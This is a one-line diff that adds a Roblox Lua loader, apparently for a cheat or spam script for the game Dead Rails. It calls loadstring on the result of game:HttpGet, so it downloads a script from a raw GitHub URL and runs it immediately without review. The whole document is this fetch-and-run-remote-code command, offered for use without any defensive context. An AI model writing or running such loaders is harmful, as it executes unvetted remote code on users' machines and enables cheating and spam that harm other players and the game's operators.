@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/dead-rails-spam6-tty5fdm4fi9u0r.lua"))()
